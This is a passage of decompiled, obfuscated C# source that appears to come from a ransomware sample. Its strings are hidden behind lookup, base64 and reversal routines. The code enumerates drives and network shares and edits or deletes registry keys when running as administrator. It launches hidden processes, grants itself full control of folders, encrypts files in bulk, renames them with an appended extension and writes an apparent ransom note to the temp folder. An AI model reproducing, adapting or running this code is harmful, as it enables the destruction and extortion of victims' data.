		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107392546));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!tHRBvePvZt.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107392493), getString_0(107397232)).Replace(getString_0(107392488), getString_0(107392493))
					.Replace(getString_0(107392447), getString_0(107393456))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					tHRBvePvZt.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107392493), getString_0(107397232)).Replace(getString_0(107392488), getString_0(107392493))
						.Replace(getString_0(107392447), getString_0(107393456))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107392442), getString_0(107393456)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string EYyCcfVgmmBPY(string ZLkxoZkBWDUItX = "", string xXocSRMfTY = "")
	{
		string result = getString_0(107393456);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ZLkxoZkBWDUItX,
				Arguments = xXocSRMfTY,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void oLOJfHAoqLns(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392433),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string TDHmCdnnGWV(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string QqgSuZNWThrmn(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void NCczxXTQBGfnV()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		iuJLCgBXSLc();
		List<vouvhjEwhIQ> list = vouvhjEwhIQ.QUuFnjBQgNDkgL();
		foreach (vouvhjEwhIQ item in list)
		{
			RuVXySfegGdfFir.Add(item.IPAddress);
		}
		List<string> ruVXySfegGdfFir = RuVXySfegGdfFir;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate19 = delegate(string string_0)
			{
				LJzaYuCmVDq CS_0024_003C_003E8__locals0 = new LJzaYuCmVDq();
				CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp = string_0;
				if ((!CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp.StartsWith(getString_0(107390048)) && !CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp.StartsWith(getString_0(107390043)) && !CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp.StartsWith(getString_0(107390034)) && !CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp.StartsWith(getString_0(107393456))) || !LbcJBNJHfSTPXkS.SPyYdXddNqMJB(CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp))
				{
					return;
				}
				try
				{
					Thread.Sleep(QMoSPhxUXPCw);
					tHRBvePvZt.Add(getString_0(107392493) + CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp + getString_0(107390053));
					try
					{
						if (DolWpTQIcvjTgATJ)
						{
							Console.WriteLine(getString_0(107392493) + CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp + getString_0(107390053));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(QMoSPhxUXPCw);
						tHRBvePvZt.Add(LJzaYuCmVDq.getString_0(107392499) + CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp + LJzaYuCmVDq.getString_0(107397238) + (char)int_0 + LJzaYuCmVDq.getString_0(107407025));
						try
						{
							if (DolWpTQIcvjTgATJ)
							{
								Console.WriteLine(LJzaYuCmVDq.getString_0(107392499) + CS_0024_003C_003E8__locals0.ZRXxGWSHYXQWp + LJzaYuCmVDq.getString_0(107397238) + (char)int_0 + LJzaYuCmVDq.getString_0(107407025));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(ruVXySfegGdfFir, CS_0024_003C_003E9__CachedAnonymousMethodDelegate19);
		try
		{
			LbcJBNJHfSTPXkS.vdOKiXoUMejiEPZ vdOKiXoUMejiEPZ = new LbcJBNJHfSTPXkS.vdOKiXoUMejiEPZ(LbcJBNJHfSTPXkS.ADxPPmczLJcWRuGb.YmGreNPoXYG, LbcJBNJHfSTPXkS.OsjLuXcQWOiB.WGbIrUJwUMADG, LbcJBNJHfSTPXkS.yezCurjdXgo.kVvaWXmTAVKbaa, LbcJBNJHfSTPXkS.YdHPjckeWckr.yaAIrwNohT);
			foreach (string item2 in vdOKiXoUMejiEPZ)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107392416));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!tHRBvePvZt.Contains(item3.ToString()))
						{
							tHRBvePvZt.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (DolWpTQIcvjTgATJ)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		QTTzqxCDUaY.dcsDyoXwhZtxr();
		try
		{
			if (DolWpTQIcvjTgATJ)
			{
				Console.WriteLine(getString_0(107391855));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = TDHmCdnnGWV(getString_0(107391814));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(QqgSuZNWThrmn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(QqgSuZNWThrmn(getString_0(107391677)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(QqgSuZNWThrmn(getString_0(107391652)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (uBQXQHcitwPxXk == getString_0(107396798))
		{
			UnbQkIgWNdhxuG.kDSSvpMJEHKWrq();
		}
		try
		{
			if (DolWpTQIcvjTgATJ)
			{
				Console.WriteLine(getString_0(107392087));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107392546));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (tHRBvePvZt.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107392493), getString_0(107397232)).Replace(getString_0(107392488), getString_0(107392493))
					.Replace(getString_0(107392447), getString_0(107393456))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (DolWpTQIcvjTgATJ)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107392493), getString_0(107397232)).Replace(getString_0(107392488), getString_0(107392493))
							.Replace(getString_0(107392447), getString_0(107393456))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107392442), getString_0(107393456)));
					}
				}
				catch
				{
				}
				tHRBvePvZt.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107392493), getString_0(107397232)).Replace(getString_0(107392488), getString_0(107392493))
					.Replace(getString_0(107392447), getString_0(107393456))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107392442), getString_0(107393456)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (DolWpTQIcvjTgATJ)
			{
				Console.WriteLine(getString_0(107392030));
			}
		}
		catch
		{
		}
	}

	public static void xCEwJwbanHmjooe(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = QqgSuZNWThrmn(getString_0(107391961));
		processStartInfo.Arguments = getString_0(107391932) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool IOttHDtrCjGUm(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string iBWhaZTDHfsDS(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void NSDiFEymnXxE()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = TDHmCdnnGWV(getString_0(107391927));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(QqgSuZNWThrmn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391309)));
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391252)));
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391267)));
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391242)));
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391961)));
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391185)));
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391156)));
					registryKey.Close();
				}
				string_ = TDHmCdnnGWV(getString_0(107391171));
				registryKey = Registry.LocalMachine.OpenSubKey(QqgSuZNWThrmn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391586)));
					registryKey.Close();
				}
				string_ = TDHmCdnnGWV(getString_0(107391537));
				registryKey = Registry.LocalMachine.OpenSubKey(QqgSuZNWThrmn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391586)));
					registryKey.Close();
				}
				string_ = TDHmCdnnGWV(getString_0(107391537));
				registryKey = Registry.CurrentUser.OpenSubKey(QqgSuZNWThrmn(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(QqgSuZNWThrmn(getString_0(107391586)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107391520)), QqgSuZNWThrmn(getString_0(107391535)));
			EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107391454)), QqgSuZNWThrmn(getString_0(107391445)));
			EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107391454)), QqgSuZNWThrmn(getString_0(107390819)));
			EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107390758)), QqgSuZNWThrmn(getString_0(107390709)));
		}
		catch
		{
		}
	}

	public static void OUVgqzYMvbARRN(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(QqgSuZNWThrmn(getString_0(107390668)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void gNuoxLUJuse()
	{
		string string_ = TDHmCdnnGWV(getString_0(107390611));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(QqgSuZNWThrmn(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(QqgSuZNWThrmn(getString_0(107391074)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void iuJLCgBXSLc()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107391041)), QqgSuZNWThrmn(getString_0(107390996)));
			EYyCcfVgmmBPY(QqgSuZNWThrmn(getString_0(107391041)), QqgSuZNWThrmn(getString_0(107390866)));
		}
	}

	public static void JCyivAFPoKMiI()
	{
		EYyCcfVgmmBPY(getString_0(107397037), QqgSuZNWThrmn(getString_0(107390208)));
		string text = QqgSuZNWThrmn(getString_0(107390526));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107392447) + text + getString_0(107392447) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397037);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void RWmueCtbpjJAa(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (fvDSfFEVAaG)
			{
				try
				{
					File.AppendAllText(qiQAhhXEbdwvY, getString_0(107390461) + string_0 + getString_0(107390452) + ex.Message + getString_0(107396328));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string kdEHjiIxPH()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107393456);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107390363);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107390386))) ? getString_0(107390368) : getString_0(107390409));
				break;
			case 0:
				text = getString_0(107390391);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107390358);
				break;
			case 4:
				text = getString_0(107390377);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107390327) : getString_0(107390336));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389791) : getString_0(107390340)) : getString_0(107390345)) : getString_0(107390322));
				break;
			case 10:
				text = getString_0(107389786);
				break;
			}
		}
		if (text != getString_0(107393456))
		{
			text = getString_0(107389781) + text;
			if (oSVersion.ServicePack != getString_0(107393456))
			{
				text = text + getString_0(107389800) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string QswUgwGLjBGQYB(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395381);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(QqgSuZNWThrmn(getString_0(107395356)));
				streamWriter.WriteLine(getString_0(107396328));
				streamWriter.WriteLine(QqgSuZNWThrmn(getString_0(107393370)));
				streamWriter.WriteLine(string_0);
				if (mNTCrJeXlKdoL)
				{
					streamWriter.WriteLine(getString_0(107396328));
					streamWriter.WriteLine(QqgSuZNWThrmn(getString_0(107393292)));
					streamWriter.WriteLine(WvzKEuHaCmnRFN.ZFtKFOgpGbKvcG());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !ikJhDajEXzE)
				{
					File.AppendAllText(text, getString_0(107393259) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (fvDSfFEVAaG)
			{
				try
				{
					File.AppendAllText(qiQAhhXEbdwvY, getString_0(107389795) + ex.Message + getString_0(107396328));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void EYNETvUCNwXVP(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		jEtbiKyHfA.rGFvoRPmTAGv CS_0024_003C_003E8__locals0 = new jEtbiKyHfA();
		CS_0024_003C_003E8__locals0.wyJzwLFxBwBOC = string_1;
		CS_0024_003C_003E8__locals0.mDChvUlwdKJLJ = string_2;
		CS_0024_003C_003E8__locals0.tvXDlrlmTaapy = string_3;
		CS_0024_003C_003E8__locals0.FOASbRAtLPbX = string_4;
		wYUomwviRA = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.tvXDlrlmTaapy);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396544))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !tHRBvePvZt.Contains(array[i].Name))
					{
						tHRBvePvZt.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!tHRBvePvZt.Contains(string_0[j]))
				{
					tHRBvePvZt.Add(string_0[j]);
				}
			}
		}
		if (tHRBvePvZt.Contains(QqgSuZNWThrmn(getString_0(107389738))) && GddPzlyyTjLXDhDdd == getString_0(107396798))
		{
			tHRBvePvZt.Remove(QqgSuZNWThrmn(getString_0(107389738)));
		}
		Parallel.ForEach(tHRBvePvZt, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new jEtbiKyHfA.rGFvoRPmTAGv();
			CS_0024_003C_003E8__locals0.UrQhEdizfN = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.myjcSDZZeNX = string_0;
			if (xYpnNhEseitt && !kdEHjiIxPH().Contains(jEtbiKyHfA.getString_0(107390338)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						IOttHDtrCjGUm(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.myjcSDZZeNX);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (HRBtCVbsJzEiv == jEtbiKyHfA.getString_0(107396809))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					IsPUoYHanjhwp(CS_0024_003C_003E8__locals0.myjcSDZZeNX, CS_0024_003C_003E8__locals0.UrQhEdizfN.wyJzwLFxBwBOC, CS_0024_003C_003E8__locals0.UrQhEdizfN.FOASbRAtLPbX, CS_0024_003C_003E8__locals0.UrQhEdizfN.mDChvUlwdKJLJ, CS_0024_003C_003E8__locals0.UrQhEdizfN.tvXDlrlmTaapy);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				IsPUoYHanjhwp(CS_0024_003C_003E8__locals0.myjcSDZZeNX, CS_0024_003C_003E8__locals0.wyJzwLFxBwBOC, CS_0024_003C_003E8__locals0.FOASbRAtLPbX, CS_0024_003C_003E8__locals0.mDChvUlwdKJLJ, CS_0024_003C_003E8__locals0.tvXDlrlmTaapy);
			}
		});
	}

	public static void IsPUoYHanjhwp(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107393456));
		List<string> list3 = list2;
		if (CSCDqgbxncBKlCTT == getString_0(107397055))
		{
			list = ZMVXiDPbvZjibg(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = tBfiviphBCfPXk.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03a0;
					}
				}
				if ((FJnMkJLuWdeKj == getString_0(107397055) && !item.EndsWith(text)) || dfsgzoHLEAZnW.Contains(item))
				{
					continue;
				}
				if (iFejgjdImWjFLfEJ == getString_0(107396798))
				{
					try
					{
						if (JHjCFdacWDCwN.kXAYfEbwZpl(item))
						{
							JHjCFdacWDCwN.uJhjcXrkFlLBC(item);
						}
					}
					catch
					{
					}
				}
				dfsgzoHLEAZnW.Add(item);
				if (!wwtCrdNFpS.Contains(Path.GetDirectoryName(item)))
				{
					wwtCrdNFpS.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (TNpgrHCAoXmhjxRU == getString_0(107396798) && fileStream.Length > Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024 && !list3.Contains(text))
					{
						if (UgGccBxJROB == getString_0(107396798))
						{
							foreach (string item2 in sMhKmHJvtlNZhjZ)
							{
								if (item.ToLower().EndsWith(item2) && nDWwTnbqwmod == getString_0(107396798))
								{
									if (Convert.ToInt32(yzFHxOjAMjqD) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393537), getString_0(107393500), getString_0(107393519), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && nDWwTnbqwmod == getString_0(107397055))
								{
									try
									{
										WvzKEuHaCmnRFN.TuLLWzXJhisVm(getString_0(107393537), getString_0(107393500), getString_0(107393519), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = UcPQEhwbPwt.RfngZyLuPZaRn(item, Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024);
						byte[] vilQxGdSKPVC = UcPQEhwbPwt.PeZryOJEgIE(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						UcPQEhwbPwt.vTfgqKCmDAm(item, vilQxGdSKPVC);
						if (string_2 != getString_0(107389729))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389729))
					{
						QXLBzxsVHzs(item, item + string_2, wYUomwviRA);
					}
					else
					{
						QXLBzxsVHzs(item, item + getString_0(107389692), wYUomwviRA);
					}
				}
				catch (Exception)
				{
				}
				IL_03a0:;
			}
		}
	}

	public static void ujZeWjRsRCpoZV(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		iathxhxZEnZYRxr.VfXuPHCMuymp CS_0024_003C_003E8__locals0 = new iathxhxZEnZYRxr();
		CS_0024_003C_003E8__locals0.maqAcdxAuaVA = list_0;
		CS_0024_003C_003E8__locals0.oUtDEXanHATFjP = string_1;
		CS_0024_003C_003E8__locals0.lfllMCihWCs = string_2;
		CS_0024_003C_003E8__locals0.CmjdIJNPEyJFWZ = string_3;
		CS_0024_003C_003E8__locals0.LShaCPUCJfEf = new List<string> { getString_0(107393456) };
		if (FJnMkJLuWdeKj == getString_0(107397055))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.maqAcdxAuaVA)
				{
					if (CS_0024_003C_003E8__locals0.lfllMCihWCs.Length != 0)
					{
						string[] lfllMCihWCs2 = CS_0024_003C_003E8__locals0.lfllMCihWCs;
						int num2 = 0;
						while (num2 < lfllMCihWCs2.Length)
						{
							string value2 = lfllMCihWCs2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_094b;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.oUtDEXanHATFjP))
						{
							goto IL_094b;
						}
					}
					catch (Exception)
					{
						goto IL_094b;
					}
					if (item.EndsWith(string_0) && !dfsgzoHLEAZnW.Contains(item))
					{
						if (iFejgjdImWjFLfEJ == iathxhxZEnZYRxr.getString_0(107396817))
						{
							try
							{
								if (JHjCFdacWDCwN.kXAYfEbwZpl(item))
								{
									JHjCFdacWDCwN.uJhjcXrkFlLBC(item);
								}
							}
							catch
							{
							}
						}
						dfsgzoHLEAZnW.Add(item);
						if (!wwtCrdNFpS.Contains(Path.GetDirectoryName(item)))
						{
							wwtCrdNFpS.Add(Path.GetDirectoryName(item));
						}
						RWmueCtbpjJAa(item);
						try
						{
							new iyWSnjnabYn().XvqXWKXAtrbuzV(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (DolWpTQIcvjTgATJ)
									{
										Console.WriteLine(iathxhxZEnZYRxr.getString_0(107407033) + item + iathxhxZEnZYRxr.getString_0(107407468) + new FileInfo(item).Length + iathxhxZEnZYRxr.getString_0(107407479));
										Console.WriteLine(iathxhxZEnZYRxr.getString_0(107407438));
									}
								}
								catch
								{
								}
								EYyCcfVgmmBPY(QqgSuZNWThrmn(iathxhxZEnZYRxr.getString_0(107407333)), iathxhxZEnZYRxr.getString_0(107392466) + item + iathxhxZEnZYRxr.getString_0(107392466) + QqgSuZNWThrmn(iathxhxZEnZYRxr.getString_0(107407308)) + iathxhxZEnZYRxr.getString_0(107392466) + Environment.UserName + iathxhxZEnZYRxr.getString_0(107392466) + QqgSuZNWThrmn(iathxhxZEnZYRxr.getString_0(107407323)));
							}
						}
						catch (Exception ex16)
						{
							if (fvDSfFEVAaG)
							{
								try
								{
									File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + item + iathxhxZEnZYRxr.getString_0(107407298) + ex16.Message + iathxhxZEnZYRxr.getString_0(107396347));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex18)
							{
								if (fvDSfFEVAaG)
								{
									try
									{
										File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + item + iathxhxZEnZYRxr.getString_0(107406673) + ex18.Message + iathxhxZEnZYRxr.getString_0(107396347));
									}
									catch (Exception)
									{
									}
								}
								bPwGjuPFVSkSv++;
								goto end_IL_02cd_2;
							}
							if (!(TNpgrHCAoXmhjxRU == iathxhxZEnZYRxr.getString_0(107396817)) || new FileInfo(item).Length <= Convert.ToInt32(qpeehHsICuPA) * 1024 * 1024 || CS_0024_003C_003E8__locals0.LShaCPUCJfEf.Contains(string_0))
							{
								if (mNTCrJeXlKdoL)
								{
									CS_0024_003C_003E8__locals0.oUtDEXanHATFjP = bKhumNWWxHrd + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP;
								}
								string text3 = DPogULUxIgM.rxoNTzmfopSMb(32);
								string s3 = qQVKYmLneEhR.HpWrTpHQoP(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.oUtDEXanHATFjP != iathxhxZEnZYRxr.getString_0(107389748))
								{
									if (!XSErQnXGRX)
									{
										if (!ikJhDajEXzE)
										{
											RWkakVMvZzWyf(item, item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, wYUomwviRA);
										}
										else
										{
											RWkakVMvZzWyf(item, item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!ikJhDajEXzE)
											{
												KTFeWSRIhASFlx(item, item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, wYUomwviRA);
											}
											else
											{
												KTFeWSRIhASFlx(item, item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex20)
										{
											if (fvDSfFEVAaG)
											{
												try
												{
													File.AppendAllText(qiQAhhXEbdwvY, iathxhxZEnZYRxr.getString_0(107390480) + item + iathxhxZEnZYRxr.getString_0(107389702) + ex20.Message + iathxhxZEnZYRxr.getString_0(107396347));
												}
												catch (Exception)
												{
												}
											}
											bPwGjuPFVSkSv++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.oUtDEXanHATFjP, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!XSErQnXGRX)
								{
									if (!ikJhDajEXzE)
									{
										RWkakVMvZzWyf(item, item + iathxhxZEnZYRxr.getString_0(107389711), wYUomwviRA);
									}
									else
									{
